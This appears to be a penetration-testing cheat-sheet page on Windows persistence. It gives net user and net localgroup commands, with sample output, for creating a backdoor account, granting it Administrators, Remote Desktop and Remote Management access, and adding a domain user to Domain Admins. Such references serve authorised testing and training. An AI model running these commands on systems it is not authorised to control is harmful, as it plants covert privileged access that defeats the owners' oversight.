---
title: "Persistence"
date: 2024-9-30
tags: ["AddMember", "Account", "Windows", "Persistence"]
---

### Add local user

```console
# Create new user
net user '<USER>' '<PASSWORD>' /add
```

```console {class="sample-code"}
PS C:\WINDOWS\system32> net user test Test1234!@ /add
The command completed successfully.
```

```console
# Add user to admin group
net localgroup Administrators '<USER>' /add
```

```console {class="sample-code"}
PS C:\WINDOWS\system32> net localgroup administrators test /add
The command completed successfully.
```

```console
# Add user to remote desktop group
net localgroup "Remote Desktop Users" '<USER>' /add
```

```console {class="sample-code"}
PS C:\WINDOWS\system32> net localgroup "remote desktop users" test /add
The command completed successfully.
```

```console
# Add user to remote management group
net localgroup "Remote Management Users" '<USER>' /add
```

```console {class="sample-code"}
PS C:\WINDOWS\system32> net localgroup "Remote Management Users" test /add
The command completed successfully.
```

```console
# Check
net user <USER>
```

```console {class="sample-code"}
PS C:\WINDOWS\system32> net user test
net user test
User name                    test
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/30/2024 7:20:12 AM
Password expires             Never
Password changeable          10/1/2024 7:20:12 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   9/30/2024 7:24:50 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Desktop Users 
                             *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.
```

### Add domain user

```console
net user '<USER>' '<PASSWORD>' /add /domain
```

```console
net group 'Domain Admins' '<USER>' /add /domain
```